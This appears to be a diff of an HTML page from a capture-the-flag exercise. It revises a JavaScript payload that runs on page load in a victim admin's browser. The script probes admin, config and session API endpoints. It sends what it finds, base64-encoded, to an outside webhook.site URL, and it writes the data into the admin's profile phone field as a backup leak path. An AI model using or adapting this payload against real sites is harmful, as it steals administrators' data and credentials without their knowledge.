@@ -2,37 +2,47 @@
 <html>
 <body>
 <script>
-    async function pwn() {
+    async function internalLeak() {
         const webhook = "https://webhook.site/9c58164d-24e0-4e24-bb41-8742b6e95e5e";
-        let flagData = "Not Found";
+        
+        // List of high-value endpoints to check for the flag
+        const secretEndpoints = [
+            '/api/admin/flag',
+            '/api/auth/me',
+            '/api/system/config',
+            '/api/admin/settings'
+        ];
 
-        try {
-            // 1. Try to grab the high-value flag
-            const response = await fetch('/api/admin/flag');
-            flagData = await response.text();
-            
-            // 2. Send to Webhook (External)
-            fetch(`${webhook}?flag=${btoa(flagData)}`);
-        } catch (e) {
-            // 3. If /api/admin/flag fails, try the profile endpoint
-            const res2 = await fetch('/api/auth/profile');
-            const data2 = await res2.json();
-            flagData = JSON.stringify(data2);
-            fetch(`${webhook}?profile=${btoa(flagData)}`);
+        let foundData = "No flag found in common endpoints";
+
+        for (let url of secretEndpoints) {
+            try {
+                let response = await fetch(url);
+                if (response.ok) {
+                    let text = await response.text();
+                    if (text.length > 5) { // Ensure we got actual data
+                        foundData = `${url}: ${text}`;
+                        break; // Stop at the first one that works
+                    }
+                }
+            } catch (e) {}
         }
 
-        // 4. Internal Leak: Write the result into the admin's own profile
-        // This is your backup in case the webhook is blocked!
+        // LEAK 1: External (Might be blocked, but good to try)
+        fetch(`${webhook}?leaked=${btoa(foundData)}`);
+
+        // LEAK 2: Internal (The bypass)
+        // We write the flag into the admin's profile field 'phoneNumber'
         await fetch('/api/auth/profile', {
             method: 'PATCH',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
-                "phoneNumber": flagData.substring(0, 50), // Leak first 50 chars
-                "fullName": "Flag_In_Phone_Field"
+                "phoneNumber": foundData.substring(0, 100),
+                "fullName": "LOOK_AT_PHONE_FIELD"
             })
         });
     }
-    pwn();
+    internalLeak();
 </script>
 </body>
 </html>
